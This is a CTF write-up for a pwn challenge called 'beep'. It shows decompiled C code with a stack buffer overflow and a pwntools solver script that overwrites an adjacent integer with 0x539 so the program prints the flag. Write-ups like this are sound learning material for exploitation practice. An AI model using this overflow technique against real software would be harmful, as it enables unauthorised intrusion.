---
description: Binary Exploitation / Pwn
---

# beep

> Kenneth verkar ha problem med kommunikationen till andra system han tagit över. Harriet har nämligen hittat något slags litet testprogram vars syfte verkar vara att testa att en anslutning fungerar.
>
> Testprogrammet verkar vara ganska minimalt, men även små program kan innehålla buggar...
>
> Anslut till `undutmaning-beep.chals.io:443` och testa anslutningen du också.
>
> <details>
>
> <summary>Visa gratis tips/ledtråd</summary>
>
> Harriet tror att det finns en buffer overflow i koden. Pröva att undersöka programmet med t.ex. `Ghidra` och `gdb` för att se ifall du kan knäcka buggen!
>
> </details>
>
> <details>
>
> <summary>Visa gratis tips/ledtråd</summary>
>
> `setup()`-funktionen kan ignoreras då den endast sätter en timer på utmaningen samt stänger av buffering på `stdin`/`stdout`/`stderr`.
>
> </details>

{% file src="../../.gitbook/assets/beep" %}

A simple integer variable overwrite challenge, looking into the Ghidra disassembly, the code looked like this:

```c
undefined8 main(void)

{
  undefined local_78 [108];
  int local_c;
  
  setup();
  printf("* beeeeeeeeeeeeeeeeeeeeeeeeeeep *\n> ");
  read(0,local_78,0x108);
  if (local_c == 0x539) {
    system("cat flag");
  }
  return 0;
}
```

Simple goal, I had to overwrite the compared variable with `0x539`, and guess what it translates to 1337.

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Pretty much, the solution required me to find the offset to the comparison instruction using cyclic offsets, so here was the final solver script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# -*- template: wintertia -*-

# ====================
# -- PWNTOOLS SETUP --
# ====================

from pwn import *

exe = context.binary = ELF(args.EXE or 'beep')
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

host = args.HOST or 'undutmaning-beep.chals.io'
port = int(args.PORT or 443)

def start_local(argv=[], *a, **kw):
	'''Execute the target binary locally'''
	if args.GDB:
		return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
	else:
		return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
	'''Connect to the process on the remote host'''
	io = connect(host, port, ssl=True, sni=host)
	if args.GDB:
		gdb.attach(io, gdbscript=gdbscript)
	return io

def start(argv=[], *a, **kw):
	'''Start the exploit against the target.'''
	if args.LOCAL:
		return start_local(argv, *a, **kw)
	else:
		return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *main+59
continue
'''.format(**locals())

# =======================
# -- EXPLOIT GOES HERE --
# =======================

def exploit():
	io = start()
	
	OFFSET = 108

	payload = flat(
		cyclic(OFFSET),
		0x539
	)

	io.sendlineafter(b'> ', payload)
	
	io.interactive()

if __name__ == "__main__":
	exploit()

```

Here is an example of the challenge being solved locally (ignore it saying picoCTF that's just my template fake flag:relaxed:):

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
